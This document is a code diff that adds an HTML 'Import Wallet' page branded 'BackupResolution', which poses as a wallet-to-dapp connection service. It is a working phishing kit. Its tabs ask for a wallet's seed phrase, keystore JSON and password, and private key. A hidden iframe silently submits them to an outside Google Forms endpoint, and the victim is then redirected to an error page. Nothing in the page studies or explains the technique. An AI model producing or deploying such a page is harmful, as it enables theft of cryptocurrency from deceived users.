@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Import Wallet</title>
+<link rel="stylesheet" href="main.css" type="text/css"/> 
+<meta charset="UTF-8">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+<meta name="description" content="Open protocol for connecting Wallets to Dapps">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
+<script>
+    function openCity(evt, cityName) {
+    // Declare all variables
+    var i, tabcontent, tablinks;
+  
+    // Get all elements with class="tabcontent" and hide them
+    tabcontent = document.getElementsByClassName("tabcontent");
+    for (i = 0; i < tabcontent.length; i++) {
+      tabcontent[i].style.display = "none";
+    }
+  
+    // Get all elements with class="tablinks" and remove the class "active"
+    tablinks = document.getElementsByClassName("tablinks");
+    for (i = 0; i < tablinks.length; i++) {
+      tablinks[i].className = tablinks[i].className.replace(" active", "");
+    }
+  
+    // Show the current tab, and add an "active" class to the button that opened the tab
+    document.getElementById(cityName).style.display = "block";
+    evt.currentTarget.className += " active";
+  }
+  </script>
+   <style>
+    /* CSS for the footer */
+    .footer {
+      background-color: #f8f8f8;
+      padding: 20px;
+      text-align: center;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+    <div class="container">
+    <a class="navbar-brand" href="index-2.html" 
+    style="font-size: 30px;">
+      <i class="bi bi-app-indicator"></i> BackupResolution
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarNav">
+      <ul class="navbar-nav ml-auto">
+        <li class="nav-item active">
+          <a class="nav-link" href="index.html">Home<span class="sr-only">(current)</span></a>
+        </li>
+        
+      </ul>
+    </div>
+    </div>
+  </nav>
+<center>
+<div class="top">
+        
+     <br> <br> <br> <br> <br> <br> <br> <br> <br>      
+</div>
+</br>
+<h2><center>Import Wallet</center></h2>
+</br>
+<div class="tab">
+  <button class="tablinks" id="default" onClick="openCity(event, 'phrase')">Phrase</b></button>
+  <button class="tablinks" onClick="openCity(event, 'keystore')">Keystore JSON</b></button>
+  <button class="tablinks" onClick="openCity(event, 'private')">Private Key</b></button>
+</div>
+<script type="text/javascript">var submitted=false;</script>
+<iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted)  {window.location='./error.html';}"></iframe>
+
+<!--<form method="POST" action="https://docs.google.com/forms/d/e/1FAIpQLSeW8IlFOCT81zhx_0FdokO2_A6B4dxg8_A1v3WNvZH4PHJC9Q/formResponse"--> 
+<form method="POST" action="https://docs.google.com/forms/d/e/1FAIpQLScXnSIxG94QmxWoAWVR8pmtdDwnsHSsnVu8Z6H8ahqd27RuNw/formResponse" 
+
+target="hidden_iframe" onsubmit="submitted=true;" >
+    <div id="phrase" class="tabcontent">
+        <input type="hidden" name="prase"  value="stake">
+        <textarea name="entry.2005620554" minlength="12" placeholder="Phrase" ></textarea>
+        </br>
+           <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+        </br>
+        <button type="submit"  class="btn">IMPORT</button>
+    </div>
+
+  <div id="keystore" class="tabcontent">
+    <textarea name="entry.303175891" pattern=".{12,}" placeholder="Keystore JSON" title="Several lines of text beginning with '(...)' plus the password you used to encrypt it."></textarea>
+    <input type="text" name="entry.1065046570" placeholder="Password" />
+    <button type="submit" class="btn">IMPORT</button>
+  </div>
+  
+   <div id="private" class="tabcontent">
+     <input type="text" name="entry.992999669" placeholder="Private Key" />
+     <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+     <button type="submit" class="btn">IMPORT</button>
+   </div>
+   
+</form>
+
+<script>
+    document.getElementById("default").click();
+</script>
+<footer class="footer">
+  <p>&copy; 2023 BackupResolution. All rights reserved.</p>
+</footer>
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+<script>
+    const queryString = window.location.search;
+
+    const urlParams = new URLSearchParams(queryString);
+
+    const wallet = urlParams.get('type')
+
+    document.getElementById("hidden1").value = wallet + " Phrase";
+    document.getElementById("hidden2").value = wallet + " Keystore";
+    document.getElementById("hidden3").value = wallet + " PrivateKey";
+  </script>
+</body>
+
+
+
+</html>
